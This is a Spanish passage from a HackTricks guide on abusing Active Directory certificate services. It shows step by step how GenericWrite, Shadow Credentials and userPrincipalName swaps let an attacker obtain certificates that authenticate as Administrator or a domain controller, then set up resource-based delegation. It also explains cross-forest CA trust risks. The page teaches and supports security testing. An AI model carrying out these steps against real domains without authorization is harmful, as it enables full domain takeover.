Primero, obtenemos el hash de `Jane` con, por ejemplo, Shadow Credentials (usando nuestro `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Luego, cambiamos el `userPrincipalName` de `Jane` para que sea `Administrator`. Nota que estamos omitiendo la parte de `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

Esto no es una violación de restricción, ya que el `userPrincipalName` del usuario `Administrator` es `Administrator@corp.local` y no `Administrator`.

Ahora, solicitamos cualquier certificado que permita la autenticación de cliente, por ejemplo, la plantilla predeterminada `User`. Debemos solicitar el certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Nota que el `userPrincipalName` en el certificado es `Administrator`.

Luego, cambiamos de nuevo el `userPrincipalName` de `Jane` a ser algo más, como su `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Ahora, si intentamos autenticarnos con el certificado, recibiremos el hash NT del usuario `Administrator@corp.local`. Necesitarás agregar `-domain <domain>` a tu línea de comandos ya que no hay un dominio especificado en el certificado.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Caso de Abuso 2

* `CertificateMappingMethods` contiene la bandera de bit `UPN` (`0x4`)
* `GenericWrite` sobre cualquier cuenta A para comprometer cualquier cuenta B sin una propiedad `userPrincipalName` (cuentas de máquina y administrador de dominio integrado `Administrator`)

En este caso, `John@corp.local` tiene `GenericWrite` sobre `Jane@corp.local`, y queremos comprometer el controlador de dominio `DC$@corp.local`.

Primero, obtenemos el hash de `Jane` con, por ejemplo, Shadow Credentials (usando nuestro `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Luego, cambiamos el `userPrincipalName` de `Jane` para que sea `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Esto no es una violación de restricción, ya que la cuenta de computadora `DC$` no tiene `userPrincipalName`.

Ahora, solicitamos cualquier certificado que permita la autenticación de cliente, por ejemplo, la plantilla predeterminada `User`. Debemos solicitar el certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

Luego, cambiamos de nuevo el `userPrincipalName` de `Jane` a ser algo más, como su `userPrincipalName` original (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Ahora, dado que esta clave de registro se aplica a Schannel, debemos usar el certificado para autenticación a través de Schannel. Aquí es donde entra en juego la nueva opción `-ldap-shell` de Certipy.

Si intentamos autenticarnos con el certificado y `-ldap-shell`, notaremos que estamos autenticados como `u:CORP\DC$`. Esto es una cadena que envía el servidor.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

Uno de los comandos disponibles para el shell LDAP es `set_rbcd` que establecerá Delegación Restringida Basada en Recursos (RBCD) en el objetivo. Así podríamos realizar un ataque RBCD para comprometer el controlador de dominio.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternativamente, también podemos comprometer cualquier cuenta de usuario donde no se haya establecido `userPrincipalName` o donde el `userPrincipalName` no coincida con el `sAMAccountName` de esa cuenta. Según mis propias pruebas, el administrador de dominio predeterminado `Administrator@corp.local` no tiene un `userPrincipalName` establecido por defecto, y esta cuenta debería por defecto tener más privilegios en LDAP que los controladores de dominio.

## Comprometiendo Bosques con Certificados

### Confianzas de CAs Rompiendo Confianzas de Bosques

La configuración para la **inscripción entre bosques** es relativamente simple. Los administradores publican el **certificado de la CA raíz** del bosque de recursos **a los bosques de cuentas** y agregan los certificados de la **CA empresarial** del bosque de recursos a los contenedores **`NTAuthCertificates`** y AIA **en cada bosque de cuentas**. Para ser claros, esto significa que la **CA** en el bosque de recursos tiene **control completo** sobre todos **los otros bosques para los que gestiona PKI**. Si los atacantes **comprometen esta CA**, pueden **falsificar certificados para todos los usuarios en los bosques de recursos y de cuentas**, rompiendo el límite de seguridad del bosque.

### Principales Extranjeros con Privilegios de Inscripción

Otra cosa de la que las organizaciones deben tener cuidado en entornos de múltiples bosques es las CAs Empresariales **publicando plantillas de certificados** que otorgan a **Usuarios Autenticados o principales extranjeros** (usuarios/grupos externos al bosque al que pertenece la CA Empresarial) **derechos de inscripción y edición**.\
Cuando una cuenta **se autentica a través de una confianza**, AD agrega el SID de **Usuarios Autenticados** al token del usuario que se autentica. Por lo tanto, si un dominio tiene una CA Empresarial con una plantilla que **otorga derechos de inscripción a Usuarios Autenticados**, un usuario en un bosque diferente podría potencialmente **inscribirse en la plantilla**. De manera similar, si una plantilla otorga explícitamente a un **principal extranjero derechos de inscripción**, entonces se crea una **relación de control de acceso entre bosques**, permitiendo a un principal en un bosque **inscribirse en una plantilla en otro bosque**.

En última instancia, ambos escenarios **aumentan la superficie de ataque** de un bosque a otro. Dependiendo de la configuración de la plantilla de certificado, un atacante podría abusar de esto para obtener privilegios adicionales en un dominio extranjero.

## Referencias

* Toda la información de esta página fue tomada de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
